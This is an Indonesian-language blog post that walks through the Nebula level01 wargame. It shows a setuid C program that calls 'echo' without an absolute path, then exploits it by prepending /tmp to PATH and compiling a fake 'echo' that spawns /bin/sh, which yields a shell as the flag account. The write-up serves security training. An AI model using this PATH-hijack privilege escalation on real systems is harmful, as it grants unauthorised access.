+++
author = "kernel-panic"
categories = ["Security", "Nebula"]
date = "2018-01-09T03:49:14+00:00"
description = "Security Wargames"
featured = "g56704342622.jpg"
featuredalt = "Nebula Level01"
featuredpath = "https://beeimg.com/images"
linktitle = ""
title = "Exploit Exercises - Nebula Level01"
type = "post"

+++
Tingkat berikutnya, {{< url-link "level01" "https://exploit-exercises.com/nebula/level01/" "target">}}, memberikan kode bahasa C untuk dievaluasi pengguna. Kode tersebut berisi kerentanan yang memungkinkan pengeksekusian program _arbitrary_.

Dalam postingan ini saya akan menjelaskan langkah-langkah yang saya ambil untuk menyelesaikan tantangan tersebut.

Saya memulai dengan melihat _source code_ untuk menemukan kerentanannya:

    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>
    #include <sys/types.h>
    #include <stdio.h>
    
    int main(int argc, char **argv, char **envp)
    {
      gid_t gid;
      uid_t uid;
      gid = getegid();
      uid = geteuid();
    
      setresgid(gid, gid, gid);
      setresuid(uid, uid, uid);
    
      system("/usr/bin/env echo and now what?");
    }

Hampir seketika, saya melihat bahwa "echo" dipanggil tanpa path absolut. Ini adalah kerentanan keamanan utama karena script akan bergantung pada variabel lingkungan shell saat ini (yang dapat dirusak).

Mari kita modifikasi path untuk memasukkan /tmp/:

    level01@nebula:/home/flag01$ PATH=/tmp:$PATH
    level01@nebula:/home/flag01$ export PATH
    level01@nebula:/home/flag01$ echo $PATH
    /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

Sekarang /tmp ada di path saat ini, kita bisa membuat "echo" perintah kita sendiri. Saya telah memasukkan kode C di bawah ini untuk (dalam istilah kerennya) _spawn a shell_.

    #include <unistd.h>
    
    int main() {
            char *args[2];
            args[0] = "/bin/sh";
            args[1] = NULL;
            execve(args[0], args, NULL);
    }

Write-up bagus tentang kode tersebut dapat ditemukan di {{< url-link "http://www.kernel-panic.it/security/shellcode/shellcode5.html" "http://www.kernel-panic.it/security/shellcode/shellcode5.html" "target">}} jika kamu penasaran dengan pembuatan dan eksekusinya.

Setelah membuat program "echo" baru, saya perlu mengkompilasi kode tersebut.

    level01@nebula:/tmp$ gcc echo.c -o echo
    level01@nebula:/tmp$ ls
    echo echo.c

Sekarang saya bisa memanggil script asli, yang sekarang akan menjalankan program "echo" yang sudah dibuat tadi:

    level01@nebula:/home/flag01$ id
    uid=1002(level01) gid=1002(level01) groups=1002(level01)
    level01@nebula:/home/flag01$ ./flag01
    sh-4.2$ id
    uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)
    sh-4.2$ getflag
    You have successfully executed getflag on a target account

Dan yaps, sukses!

<div class="videoyoutube"><div class="video-responsive"><iframe allowfullscreen="1" class="embedded-video-large" src="https://www.youtube.com/embed/gkqc1By1oaA?rel=0"></iframe></div></div>